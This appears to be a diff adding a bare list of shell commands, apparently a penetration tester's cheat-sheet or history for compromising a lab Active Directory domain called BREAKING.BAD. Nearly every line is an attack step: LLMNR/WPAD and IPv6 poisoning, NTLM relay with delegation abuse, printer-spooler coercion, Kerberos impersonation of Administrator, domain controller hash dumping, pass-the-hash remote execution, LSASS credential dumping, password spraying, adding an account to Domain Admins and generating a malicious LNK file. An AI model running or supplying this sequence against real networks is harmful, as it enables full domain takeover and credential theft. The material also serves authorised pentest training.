@@ -1,0 +1,63 @@
+responder --interface eth0 --analyze
+responder --interface eth0 --wredir --NBTNSdomain --wpad --lm
+responder-http-off
+responder-http-on
+responder-smb-off
+responder-smb-on
+bloodhound.py -c All -d breaking.bad -u anonymous -p anonymous -dc DC01.BREAKING.BAD
+nmap -sS -p 3268,3269 192.168.56.0/24
+nslookup -type=SRV _ldap._tcp.dc._msdcs.BREAKING.BAD
+mount -t cifs //192.168.56.201/C\$ /tmp/mnttarget/ -o username=anonymous -o domain=BREAKING.BAD
+rpcdump.py DC01.BREAKING.BAD | grep -A 6 MS-RPRN
+rpcdump.py DC02.BREAKING.BAD | grep -A 6 MS-RPRN
+dementor -d breaking.bad -u anonymous -p anonymous 192.168.56.1 DC02.BREAKING.BAD
+ntlmrelayx -t ldaps://DC01.BREAKING.BAD -smb2support --add-computer --delegate-access
+ntlmrelayx -t ldaps://DC01.BREAKING.BAD --remove-mic -smb2support --add-computer --delegate-access
+getST.py -spn host/DC02.BREAKING.BAD 'BREAKING.BAD/PSLTSOES$:|=}<k*z},6r>rZ7' -impersonate Administrator
+secretsdump -k -no-pass DC02.BREAKING.BAD -just-dc
+secretsdump -jus-dc hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@dc01.breaking.bad
+rpcclient -U "" -N DC01.BREAKING.BAD
+pth-net rpc group members "Domain admins" -U BREAKING.BAD/Administrator%ffffffffffffffffffffffffffffffff:a88baa3fdc8f581ee0fb05d7054d43e4 -S DC01.BREAKING.BAD
+pth-net rpc group addmem "Domain admins" Shutdown -U BREAKING.BAD/Administrator%ffffffffffffffffffffffffffffffff:a88baa3fdc8f581ee0fb05d7054d43e4 -S DC01.BREAKING.BAD
+cme smb 192.168.56.0/24 --gen-relay-list smbrelay_targets.txt
+crackmapexec smb 192.168.56.0/24 --gen-relay-list smbrelay_targets.txt
+mitm6 --ignore-nofqdn --interface eth0
+responder --interface eth0 --wredir --NBTNSdomain --wpad --lm --ProxyAuth --ForceWpadAuth
+ntlmrelayx -6 -smb2support -tf smbrelay_targets.txt -socks
+proxychains secretsdump -no-pass BREAKING.BAD/Administrator@SV01.BREAKING.BAD
+proxychains smbexec.py -no-pass BREAKING.BAD/Administrator@SV01.BREAKING.BAD
+proxychains psexec.py -no-pass BREAKING.BAD/Administrator@SV01.BREAKING.BAD
+proxychains atexec.py -no-pass BREAKING.BAD/Administrator@SV01.BREAKING.BAD
+proxychains wmiexec.py -no-pass BREAKING.BAD/Administrator@SV01.BREAKING.BAD
+proxychains dcomexec.py -no-pass BREAKING.BAD/Administrator@SV01.BREAKING.BAD
+psexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@SV01.BREAKING.BAD
+smbexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@SV01.BREAKING.BAD
+wmiexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@SV01.BREAKING.BAD
+atexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@SV01.BREAKING.BAD
+dcomexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@SV01.BREAKING.BAD
+cme smb 192.168.56.0/24 --local-auth -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 -M lsassy
+cme smb 192.168.56.0/24 --local-auth -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 -M lsassy -o BLOODHOUND=True -o NEO4JUSER=neo4j -o NEO4JPASS=Somepassw0rd
+crackmapexec smb 192.168.56.0/24 --local-auth -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 -M lsassy
+crackmapexec smb 192.168.56.0/24 --local-auth -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 -M lsassy -o BLOODHOUND=True -o NEO4JUSER=neo4j -o NEO4JPASS=Somepassw0rd
+sprayhound -d BREAKING.BAD -dc DC01.BREAKING.BAD -lu anonymous -lp anonymous -p '123456'
+sprayhound -d BREAKING.BAD -dc DC01.BREAKING.BAD -lu anonymous -lp anonymous -p 'azerty'
+lsassy -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 192.168.56.0/24
+lsassy -d BREAKING.BAD -u Administrator -p 'passw0rd' 192.168.56.0/24
+nmap -Pn -sC -sV -T3 192.168.56.201
+nmap -F -T3 192.168.56.0/24
+masscan -v -p 1-65535,U:1-65535 --rate=10000 -e eth0 192.168.56.0/24
+enum4linux -u anonymous -p anonymous DC01.BREAKING.BAD
+gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.56.0:8000/
+cme smb 192.168.56.0/24 -u anonymous -p anonymous --shares
+cme smb 192.168.56.0/24 -u '' -p '' --shares
+cme smb 192.168.56.0/24 -u anonymous -p anonymous --sessions
+cme smb 192.168.56.0/24 -u anonymous -p anonymous --loggedon-users
+cme smb 192.168.56.0/24 --local-auth -u '' -p ''
+crackmapexec smb 192.168.56.0/24 -u '' -p '' --shares
+crackmapexec smb 192.168.56.0/24 -u anonymous -p anonymous --shares
+crackmapexec smb 192.168.56.0/24 -u anonymous -p anonymous --sessions
+crackmapexec smb 192.168.56.0/24 -u anonymous -p anonymous --loggedon-users
+crackmapexec smb 192.168.56.0/24 --local-auth -u '' -p ''
+privexchange.py -ah 192.168.56.1 -d BREAKING.BAD -u anonymous -p anonymous EXCHANGE.BREAKING.BAD
+neo4j console
+lnk-generate.py --host 192.168.56.1 --type ntlm --output '@SHUTDOWN-LNK.lnk'
